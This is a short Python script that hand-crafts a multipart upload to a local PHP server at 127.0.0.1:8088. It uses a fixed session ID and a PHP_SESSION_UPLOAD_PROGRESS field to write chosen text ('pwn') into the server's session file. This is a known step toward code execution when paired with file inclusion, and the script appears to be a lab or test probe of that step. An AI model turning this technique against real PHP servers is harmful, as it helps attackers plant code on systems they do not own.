#!/usr/bin/env python3
import socket
HOST='127.0.0.1'; PORT=8088; SID='bgtest123'
def mp(parts,b):
    o=bytearray()
    for p in parts:
        o+=b'--'+b+b'\r\n'
        if 'filename' in p:
            o+=b'Content-Disposition: form-data; name="'+p['name'].encode()+b'"; filename="'+p['filename'].encode()+b'"\r\nContent-Type: application/octet-stream\r\n\r\n'
        else:
            o+=b'Content-Disposition: form-data; name="'+p['name'].encode()+b'"\r\n\r\n'
        o+=p['data']+b'\r\n'
    o+=b'--'+b+b'--\r\n'; return bytes(o)
parts=[{'name':'PHPSESSID','data':SID.encode()},
       {'name':'PHP_SESSION_UPLOAD_PROGRESS','data':b'pwn'},
       {'name':'f','filename':'a.bin','data':b'Z'*65536}]
b=b'BNDRY12345'; body=mp(parts,b)
h=(f'POST /index.php HTTP/1.1\r\nHost: {HOST}:{PORT}\r\nContent-Type: multipart/form-data; boundary={b.decode()}\r\nContent-Length: {len(body)}\r\nConnection: close\r\n\r\n').encode()
s=socket.create_connection((HOST,PORT),timeout=30); s.settimeout(30)
try: s.sendall(h+body)
except OSError as e: print('send err',e)
try:
    while s.recv(65536): pass
except OSError as e: print('recv err',e)
s.close()
